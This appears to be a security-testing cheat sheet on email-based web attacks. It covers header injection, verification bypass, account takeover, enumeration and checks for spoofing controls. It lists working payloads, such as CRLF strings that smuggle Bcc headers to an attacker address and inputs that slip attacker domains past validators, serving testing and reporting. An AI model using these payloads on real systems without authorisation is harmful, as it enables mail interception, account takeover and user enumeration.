# Email-Based Attacks

## Overview
Security vulnerabilities in email functionality including header injection, account takeover via email, and email verification bypass.

## Email Header Injection
```
# Inject additional headers via newlines in email fields
# Target: To, CC, BCC, From, Subject fields

# CRLF injection in To field:
To: victim@target.com%0d%0aBcc:attacker@attacker.com

# CC injection in Subject:
Subject: Hello%0d%0aCC:attacker@attacker.com

# In name/comment fields:
name=John%0d%0aBCC:attacker@attacker.com&email=victim@target.com

# Additional payload variations:
%0a (LF only)
%0d%0a (CRLF)
\n
\r\n
```

## Email Verification Bypass
```
# Test if email verification is enforced before sensitive actions
# Register → skip verification → can still perform actions

# Change email without verification:
PATCH /api/user
{"email": "attacker@attacker.com"}
# Does server send verification or update immediately?

# Race condition on verification:
# Send email change request + use account simultaneously
# Before verification sent/completed

# Token prediction:
# Email verification tokens: are they sequential/predictable?
# Same token length/charset as password reset?
```

## Account Takeover via Email
```
# Pre-account takeover:
# 1. Attacker registers with victim's email (no verification required)
# 2. Victim later registers or uses SSO with same email
# 3. Accounts merged → attacker gains access

# Email case sensitivity:
# Register: Admin@target.com (uppercase)
# Login with: admin@target.com (lowercase)
# Different accounts or same?

# Plus-addressing bypass:
# victim+1@gmail.com, victim+test@gmail.com
# All deliver to victim@gmail.com
# Some apps treat as different accounts
```

## Email Enumeration
```
# Different response for registered vs unregistered email
POST /forgot-password
email=test@test.com → "Email not found"
email=admin@target.com → "Email sent"

# Timing-based enumeration:
# Registered email → slower (DB lookup + email send)
# Unregistered → faster (early return)

# Registration endpoint:
POST /register
email=admin@target.com → "Email already registered"
email=notexist@x.com → "Registration successful"
```

## Subdomain Email Bypass
```
# Some apps verify email domain ownership
# Use subdomain trick: attacker@target.com.evil.com
# May be confused with target.com by naive validators

# Email regex bypass:
admin@target.com" <attacker@evil.com>
"attacker@evil.com"@target.com  (quoted local part)
attacker+@target.com@attacker.com
```

## Email as Oracle
```
# Test account existence via password reset timing/message
# Use email to enumerate users (different messages)
# Check error messages for enumeration
```

## Email Bombing / DoS
```
# If no rate limit on email sending:
# Trigger many reset emails to victim → inbox flood
# Cause legitimate reset emails to be missed
# Check rate limit on: forgot-password, resend-verification, contact forms
```

## Spoofing / SPF/DKIM Bypass (for social engineering context)
```
# Check SPF record:
dig TXT target.com | grep spf

# Check DMARC:
dig TXT _dmarc.target.com

# Missing/misconfigured SPF/DMARC → can spoof @target.com sender
# Report as missing email security controls
```

## Testing Methodology
1. Test all email input fields for header injection (CRLF + extra headers)
2. Check email verification enforcement on sensitive actions
3. Test pre-account takeover scenario
4. Test email enumeration via error messages and timing
5. Test email case sensitivity and plus-addressing
6. Check rate limiting on email-sending endpoints
7. Test email token predictability
8. Verify SPF/DMARC configuration
